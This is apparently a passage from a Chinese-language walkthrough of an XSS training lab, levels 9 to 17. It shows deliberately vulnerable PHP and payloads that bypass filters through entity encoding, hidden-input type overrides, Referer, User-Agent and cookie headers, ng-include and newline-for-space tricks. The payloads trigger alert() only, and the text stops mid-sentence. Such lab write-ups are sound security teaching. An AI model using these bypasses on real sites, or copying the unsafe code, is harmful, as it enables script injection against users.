+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>]);</span><br><span class="line"><span class="variable">$str2</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;script&quot;</span>,<span class="string">&quot;scr_ipt&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line"><span class="variable">$str3</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;on&quot;</span>,<span class="string">&quot;o_n&quot;</span>,<span class="variable">$str2</span>);</span><br><span class="line"><span class="variable">$str4</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;src&quot;</span>,<span class="string">&quot;sr_c&quot;</span>,<span class="variable">$str3</span>);</span><br><span class="line"><span class="variable">$str5</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>,<span class="string">&quot;da_ta&quot;</span>,<span class="variable">$str4</span>);</span><br><span class="line"><span class="variable">$str6</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;href&quot;</span>,<span class="string">&quot;hr_ef&quot;</span>,<span class="variable">$str5</span>);</span><br><span class="line"><span class="variable">$str7</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&quot;&#x27;</span>,<span class="string">&#x27;&amp;quot&#x27;</span>,<span class="variable">$str6</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level9.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&#x27;&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=添加友情链接 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="literal">false</span>===<span class="title function_ invoke__">strpos</span>(<span class="variable">$str7</span>,<span class="string">&#x27;http://&#x27;</span>))</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;您的链接不合法？有没有！&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;&#x27;</span>.<span class="variable">$str7</span>.<span class="string">&#x27;&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;center&gt;&lt;img src=level9.png&gt;&lt;/center&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h3 align=center&gt;payload的长度:&quot;</span>.<span class="title function_ invoke__">strlen</span>(<span class="variable">$str7</span>).<span class="string">&quot;&lt;/h3&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>除了基本的过滤，还存在一个if语句，检测我们传入的字符串中是否包含http:&#x2F;&#x2F;，不包含的话就是<code>false==false</code>，执行if语句。</p>
+<p>那么我们同样使用上面的HTML实体化编码绕过（<code>acsii转unicode</code>），但是在后面添加一个注释过的<code>http://</code></p>
+<p>payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#41;/*http://*/</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505191729983.png" alt="image-20250519172907915"></p>
+<h1 id="level10（隐藏标签hidden标签覆盖）"><a href="#level10（隐藏标签hidden标签覆盖）" class="headerlink" title="level10（隐藏标签hidden标签覆盖）"></a>level10（隐藏标签hidden标签覆盖）</h1><p>观察网页源码，发现GET传参的值值储存在了h2标签中。</p>
+<p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505200024700.png" alt="image-20250520002429581"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; sRc DaTa OnFocus &lt;sCriPt&gt; &lt;a hReF=javascript:alert()&gt;</span><br></pre></td></tr></table></figure>
+
+<p>进行过滤测试</p>
+<p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505200026467.png" alt="image-20250520002632406"></p>
+<p>全部的符号被实体化了</p>
+<p>查看网页的源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>];</span><br><span class="line"><span class="variable">$str11</span> = <span class="variable">$_GET</span>[<span class="string">&quot;t_sort&quot;</span>];</span><br><span class="line"><span class="variable">$str22</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str11</span>);</span><br><span class="line"><span class="variable">$str33</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str22</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form id=search&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;</span>.<span class="variable">$str33</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这里还有一个隐藏的传参的参数，发现过滤了<code>&lt;&gt;</code>，不能够闭合插入标签来绕过，那么这里可以使用<code>onfocus</code>事件，但是这里的输入框被隐藏了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?t_sort=&quot; onfocus=javascript:alert() type=&quot;text</span><br></pre></td></tr></table></figure>
+
+<p>这样构造的结果如下：<br><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505200053029.png" alt="image-20250520005332926"></p>
+<p>使type属性闭合得到<code>type=&quot;text&quot;</code>覆盖了后面的<code>type=&quot;hidden&quot;</code></p>
+<p>页面出现了输入框，并且在再次点击之后触发了<code>onfocus</code>事件</p>
+<p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505200055331.png" alt="image-20250520005559280"></p>
+<p><strong>注意：根据源码猜解传参的参数名，隐藏的input标签可以插入<code>type=&quot;text&quot;</code>显示，从而触发<code>onfocus</code>事件</strong></p>
+<h1 id="level11（referer传值）"><a href="#level11（referer传值）" class="headerlink" title="level11（referer传值）"></a>level11（referer传值）</h1><p>没有发现输入框，直接查看网页的源码</p>
+<p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505201459941.png" alt="image-20250520145856854"></p>
+<p>发现似乎有四个<code>&lt;input&gt;</code>标签，但是每个标签的输入框都被隐藏了</p>
+<p>这里的四个参数值()都可以尝试进行传参 ，传参的方式也不确定</p>
+<p>经过尝试GET传参的四种方式都行不通</p>
+<p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505201516578.png" alt="image-20250520151626527"></p>
+<p>经过测试在使用最后一个参数POST传参的时候</p>
+<p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505201517865.png" alt="image-20250520151751828"></p>
+<p>发现传参的值成功插入</p>
+<p>传入payload进行过滤测试</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; sRc DaTa OnFocus &lt;sCriPt&gt; &lt;a hReF=javascript:alert()&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505201519208.png" alt="image-20250520151906176"></p>
+<p>出现了传入的url，但是依旧看不到传入的内容</p>
+<p>好吧这里的解释是看这个参数的名字联想到http头referer的参数(t_ref)</p>
+<p>那么就抓包进在请求包中添加referer参数</p>
+<p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505201534140.png" alt="image-20250520153410102"></p>
+<p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505201533385.png" alt="image-20250520153338343"></p>
+<p>发现大小于符号都被过滤了，那么就尝试使用onfocus事件绕过</p>
+<p>构造payload(双引号闭合)，还要注意覆盖后面的<code>type=&quot;hidden&quot;</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?t_sort=&quot; onfocus=javascript:alert() type=&quot;text</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505202047225.png" alt="image-20250520204736190"></p>
+<p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505202046614.png" alt="image-20250520204656557"></p>
+<p>源码如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>];</span><br><span class="line"><span class="variable">$str00</span> = <span class="variable">$_GET</span>[<span class="string">&quot;t_sort&quot;</span>];</span><br><span class="line"><span class="variable">$str11</span>=<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_REFERER&#x27;</span>];</span><br><span class="line"><span class="variable">$str22</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str11</span>);</span><br><span class="line"><span class="variable">$str33</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str22</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form id=search&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str00</span>).<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_ref&quot;  value=&quot;&#x27;</span>.<span class="variable">$str33</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>可以看到这里存在隐藏的GET传参的参数<code>t_sort</code>，但是又实例化函数就闭合不了后面的hidden标签</p>
+<p><strong>注意：</strong></p>
+<p>注意是否存在http的请求头传值</p>
+<h1 id="level12（user-agent传值）"><a href="#level12（user-agent传值）" class="headerlink" title="level12（user-agent传值）"></a>level12（user-agent传值）</h1><p>查看网页的源码</p>
+<p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505202109661.png" alt="image-20250520210927612"></p>
+<p>看最后一个标签中的value值可以看到是User-Agent头</p>
+<p>与上面相同的操作相同，抓包添加<code>user-agent</code>头</p>
+<p>先测试过滤</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; sRc DaTa OnFocus &lt;sCriPt&gt; &lt;a hReF=javascript:alert()&gt; &amp;#106;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505202117112.png" alt="image-20250520211744068"></p>
+<p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505202118919.png" alt="image-20250520211823878"></p>
+<p>发现存在大写转小写的函数，过滤了大于小于符号</p>
+<p>构造payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; onfocus=javascript:alert() type=&quot;text</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505202127896.png" alt="image-20250520212739853"></p>
+<p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505202127769.png" alt="image-20250520212715704"></p>
+<p><strong>注意：</strong></p>
+<p>跟上题一样，考虑一下http头传值，这次的User-Agent传值</p>
+<h1 id="level13（cookie传值-可在网页进行）"><a href="#level13（cookie传值-可在网页进行）" class="headerlink" title="level13（cookie传值 可在网页进行）"></a>level13（cookie传值 可在网页进行）</h1><p>没有输入框查看网页的源码</p>
+<p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505211523636.png" alt="image-20250521152323582"></p>
+<p>发现了input标签中有t_cook属性</p>
+<p>想到了在请求包中的cookie值中传值</p>
+<p>修改请求包中的cookie值</p>
+<p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505211530482.png" alt="image-20250521153007439"></p>
+<p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505211530961.png" alt="image-20250521153031910"></p>
+<p>这里用到的是<strong>onclick事件绕过</strong></p>
+<p><code>onclick</code> 是 JavaScript 中最常用的 HTML 事件之一，它会在用户点击某个元素时触发，适用于几乎所有的标签</p>
+<p>不需要使用javascript伪协议</p>
+<h1 id="level14（图片属性传xss代码）"><a href="#level14（图片属性传xss代码）" class="headerlink" title="level14（图片属性传xss代码）"></a>level14（图片属性传xss代码）</h1><p>关卡问题，无法实践</p>
+<p>直接上大佬的解决办法</p>
+<p>这关是会定时转跳到一个奇怪的已经挂掉了的网站，本来是利用转跳到的网站，在那网站去上传一个，属性里面含有xss代码的图片，以达到弹窗的效果</p>
+<p>这关卡的漏洞名为<strong>exif xss</strong>漏洞，exif是<strong>可交换图像文件</strong>格式</p>
+<p>是专门为数码相机的照片设定的，可以记录****数码照片的属性信息和拍摄数据****。</p>
+<p>我们右键图片选择属性，点击详细信息就可以看到exif的相关属性。</p>
+<p><img src="https://image.3001.net/images/20210801/1627806356_61065a94900007104c897.png!small" alt="1627806356_61065a94900007104c897.png!small"></p>
+<p>我们可以在这些属性里面添加XSS代码，然后上传图片实现弹窗。</p>
+<p><strong>原理</strong></p>
+<p>攻击者利用了文件属性&#x2F;元数据字段（如标题、主题、标记、备注等）未做输入过滤的漏洞</p>
+<p>直接在文本字段中插入恶意 HTML&#x2F;JavaScript 代码</p>
+<h1 id="level15（ng-include包含路径无视html实体化）"><a href="#level15（ng-include包含路径无视html实体化）" class="headerlink" title="level15（ng-include包含路径无视html实体化）"></a>level15（ng-include包含路径无视html实体化）</h1><p>观察这一关的网页的源码</p>
+<p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505211554527.png" alt="image-20250521155420486"></p>
+<p>存在一个<strong>ng-include:</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ng-include指令就是文件包涵的意思，用来包涵外部的html文件，如果包涵的内容是地址，需要加引号</span><br><span class="line">注意：</span><br><span class="line">1.ng-include,如果单纯指定地址，必须要加引号</span><br><span class="line">2.ng-include,加载外部html，script标签中的内容不执行</span><br><span class="line">3.ng-include,加载外部html中含有style标签样式可以识别</span><br><span class="line"></span><br><span class="line">4.ng-inclue,记载外部html中的link标签可以加载</span><br></pre></td></tr></table></figure>
+
+<p>构造payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">?src=&#x27;level1.php?name=&lt;img src=1 onclick=alert(1)&gt;&#x27;</span><br><span class="line">?src=&#x27;level1.php?name=&lt;img src=1 onerror=alert(1)&gt;&#x27;</span><br><span class="line">?src=&#x27;level1.php?name=&lt;p onmousedown=alert()&gt;哈哈哈&lt;/p&gt;&#x27;</span><br><span class="line">#onmousedown 事件属性</span><br><span class="line">当鼠标按钮在元素上被按下时触发</span><br><span class="line">不同于 onclick（需要完整的点击动作），onmousedown 在按下鼠标时立即触发</span><br><span class="line">#onerror 事件,当图片加载错误的时候自动触发执行javascript恶意代码</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505211609724.png"><br>OAOAOA<br>点击欢迎用户右边生成的图片</p>
+<p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505211610321.png" alt="image-20250521161002222"></p>
+<p>OAOAOA观察本关的源码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str = $_GET[&quot;src&quot;];</span><br><span class="line">echo &#x27;&lt;body&gt;&lt;span class=&quot;ng-include:&#x27;.htmlspecialchars($str).&#x27;&quot;&gt;&lt;/span&gt;&lt;/body&gt;&#x27;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>有一个HTML实体化编码函数</p>
+<p><strong>关键：</strong></p>
+<p><strong>ng-include文件包涵，可以无视html实体化</strong></p>
+<h1 id="level16（空格绕过，无-标签）"><a href="#level16（空格绕过，无-标签）" class="headerlink" title="level16（空格绕过，无&#x2F;标签）"></a>level16（空格绕过，无&#x2F;标签）</h1><p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505211624483.png" alt="image-20250521162430437"></p>
+<p>输入的值被插入到了center标签中</p>
+<p>测试过滤</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?keyword=&quot; &#x27; sRc DaTa OnFocus OnmOuseOver OnMouseDoWn P &lt;sCriPt&gt; &lt;a hReF=javascript:alert()&gt; &amp;#106;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505211626144.png" alt="image-20250521162630016"></p>
+<p>首先是字母的小写化将script标签替换为空格，最后将空格实体化</p>
+<p>尝试使用<p>标签，但是&#x2F;也被替换为空格了</p>
+<p>观察源码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str = strtolower($_GET[&quot;keyword&quot;]);</span><br><span class="line">$str2=str_replace(&quot;script&quot;,&quot;&amp;nbsp;&quot;,$str);</span><br><span class="line">$str3=str_replace(&quot; &quot;,&quot;&amp;nbsp;&quot;,$str2);</span><br><span class="line">$str4=str_replace(&quot;/&quot;,&quot;&amp;nbsp;&quot;,$str3);</span><br><span class="line">$str5=str_replace(&quot;	&quot;,&quot;&amp;nbsp;&quot;,$str4);</span><br><span class="line">echo &quot;&lt;center&gt;&quot;.$str5.&quot;&lt;/center&gt;&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>空格可以用回车来代替绕过，回车的url编码是%0a，再配合上不用&#x2F;的<code>&lt;img&gt;、&lt;details&gt;、&lt;svg&gt;</code>等标签</p>
+<p>构造payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?keyword=&lt;svg%0aonclick=alert(1)&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505211632911.png" alt="image-20250521163237769"></p>
+<p>构造payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?keyword=&lt;image%0Asrc=1%0Aonclick=alert(1)&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505211634008.png" alt="image-20250521163450844"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?keyword=&lt;svg%0Aonload=alert(1)&gt;</span><br><span class="line">onload 事件</span><br><span class="line">当 SVG 元素完成加载时触发</span><br><span class="line">不需要用户交互，自动执行</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505211636647.png" alt="image-20250521163633529"></p>
+<p>onload事件的触发条件</p>
+<p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505211638997.png" alt="image-20250521163802944"></p>
+<p><strong>注意：</strong></p>
+<p>回车可以用来答题空格，回车的url的编码是%0A</p>
+<h1 id="level17（emebd标签）"><a href="#level17（emebd标签）" class="headerlink" title="level17（emebd标签）"></a>level17（emebd标签）</h1><p>观察网页的源码</p>
+<p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505211643076.png" alt="image-20250521164307032"></p>
+<p>测关键字的过滤</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?arg01=&quot; &#x27; sRc DaTa OnFocus OnmOuseOver OnMouseDoWn P &lt;sCriPt&gt; &lt;a hReF=javascript:alert()&gt;; &amp;arg02=&quot; &#x27; sRc DaTa OnFocus OnmOuseOver OnMouseDoWn P &lt;sCriPt&gt; &lt;a hReF=javascript:alert()&gt;;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505211644582.png" alt="image-20250521164432456"></p>
+<p>存在html实体化函数</p>
+<p>打开后缀名为swf的文件（FLASH插件的文件，现在很多浏览器都不支持FLASH插件了）</p>
+<p>下面简单说明了emebd标签，还有支持embed标签的事件</p>
+<p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505211648761.png" alt="image-20250521164818702"></p>
+<p>FLASH插件纯是副作用</p>
+<p>构造payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?arg02= onclick=alert()</span><br></pre></td></tr></table></figure>
+
+<p>点击embed标签区域</p>
+<p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505211650681.png" alt="image-20250521165047522"></p>
+<p><strong>问题：</strong></p>
+<p><strong>为什么arg01作为参数传onclick事件不能够顺利触发？</strong></p>
+<p>当arg1为空时，html标签解析为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;embed src=index.png&gt;=onclick=alert(1)</span><br></pre></td></tr></table></figure>
+
+<p>浏览器解析为：</p>
